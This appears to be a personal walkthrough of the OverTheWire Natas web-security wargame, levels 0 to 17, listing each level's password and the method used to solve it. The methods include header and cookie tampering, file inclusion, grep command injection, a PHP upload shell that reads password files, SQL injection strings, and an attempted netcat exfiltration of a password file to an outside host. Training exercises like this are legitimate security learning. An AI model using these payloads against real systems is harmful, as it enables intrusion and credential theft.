
Natas
=====

http://overthewire.org/wargames/natas/

Major takeaways:
- 

### natas0: natas0
View source.

### natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto
view-source:http://natas1.natas.labs.overthewire.org/

Right clicking disabled, download the source and have a look.

### natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
http://natas2.natas.labs.overthewire.org/files/users.txt

Directory index on /files/

### natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

"Not even Google will find it this time."

http://natas3.natas.labs.overthewire.org/robots.txt

### natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Setting the referer header.

```
$ curl --basic -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ --referer http://natas5.natas.labs.overthewire.org/
```

### natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

Using -v means you can see the Set-Cookie header and see the loggedin=0 it's trying to send.

```
$ curl --basic -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq http://natas5.natas.labs.overthewire.org/ --cookie loggedin=1 -v
```

### natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

The php source references a secret in /includes/secret.inc. 
When you run it through the form it tells you the password.

### natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

PHP file inclusion bug.

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

### natas8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Reverse the secret encoding function.

```
function decodeSecret($s) {
    return base64_decode(strrev(hex2bin($s)));
}
```

### natas9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

You can do pretty much whatever you want with that grep command to capture output.

```
http://natas9.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2F*&submit=Search
```

### natas10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

Same thing.  The filtering didn't affect the command I used.  Backticks would be fine too.

```
http://natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2F*&submit=Search
```

### natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

```
$m = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw\x3D";
echo "OriginalCookie: " . $m . "\n";
$match = base64_decode($m);

$encoded_struct = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff" ));
echo "ENCODED " . $encoded_struct . "\n";
echo "MATCH " . $match . "\n";

$key = xor_encrypt($encoded_struct, $match);
$key = 'qw8J';
echo "@KEY@: " . $key . "\n";

$reencoded = xor_encrypt($match, $key);
echo "FOUND IN OLD: " . $reencoded . "\n";


// Let's encrypt again

$new_struct = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff" ));

$newtoken = xor_encrypt2($new_struct);
echo "@NEW@: " . base64_encode($newtoken) . "\n";
echo "what is here? " . xor_encrypt2($newtoken) . "\n";

$struct = json_decode(xor_encrypt2($newtoken), true);
var_dump($struct);
```

- Should have started by understanding the XOR plaintext attack.
- Trying to reverse characters here was probably not a good idea.
- Moving this to Python was probably a bad idea. Something with base64 being different.
- PHP is wet garbage. Need to find a function to display binary data better.
- Remember to re-state your assumptions.  The key repeated every 4 characters, but ended before
  a complete revolution.  I should have looked at the key, copied out the 4 repeating characters
  and used that, rather than doubling up the key and having the last chunk be incorrect.  Tough
  to track down.

### natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

- In developer tools, change the filename to hello.php.
- That pathinfo() function uses the same file extension and doesn't filter for jpg/jpeg.
- Then it runs whatever .php files are sitting there.
```
<?php

echo "hello from me\n";

system("cat /etc/natas_webpass/*");

?>
```

### natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

- Same idea as the last one.  But it'll run exif\_imagetype() on it, so you need to have 
  enough of a JPEG file at the top to trick php, but if you add that .php file extension
  in the form, it'll run it as php again anyway.

### natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

```
$ curl --basic -u natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 http://natas14.natas.labs.overthewire.org?debug=yes -F username='" or 1#' -F password=abc123
```

### natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

I made an educated guess that the user is natas16 and verified it exists.
We can inject some SQL, but we can't get output - we only know if a row was returned or not.
I wrote a script to start trying strings and see if there exists a password that starts with 
that string. If there is, start trying more characters on the end of that string. 

Didn't realize LIKE was case-insensitive. Great. :tada:

### natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 

``` 
passthru("grep -i \"$key\" dictionary.txt"); 
```

Okay, so it's filtering things out when we run the grep command. So how do we get some output
out of this thing?  It's tough to break out of the quotes.  But we can run a subcommand, so 
there's a lot we can do.
 - Tried using `nc -l 0.0.0.0 12345` but the host doesn't accept connections.  It does hang, so netcat exists.
 - Tried using `nc server.com 12345 < /etc/natas_webpass/natas17` but it doesn't make outgoing connections.
 - Tried using `.$(echo -e \\042) /etc/natas*/* $(echo -e \\042)` to emit quotes, but it fails for some reason.

Okay, if I pull the first char of the file in the subcommand, whatever it greps out will tell me the character
it starts with at any rate.  I wonder if there are dictionary entries with numbers.  I think I can write 
something to work with isupper as well.  It seemed like a reasonable solution, and these gaps heavily reduce
the brute force space, but I'd really like to get the exact data pulled out.

Usually I'd do something like `grep ^something file && echo found` or something, but pipe is filtered out,
so I had to look at other ways.  Whatever subcommand you run still needs to be incorporated into a valid 
grep command that'll go through the dictionary file.  What I settled on was `hello$(grep -l ^%s /etc/natas_webpass/natas17)`
So if the string is in the file, it'll try to grep for hello/etc/nataswebpass/natas17 and won't find anything.
If the string isn't in the file, it'll grep for hello in the dictionary.  Using that I could basically
reuse the script from the last exercise to brute force the contents of the password file out.

### natas17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

And that'll be a totally blind SQL injection.  Well I think I can reuse 15 pretty much completely.



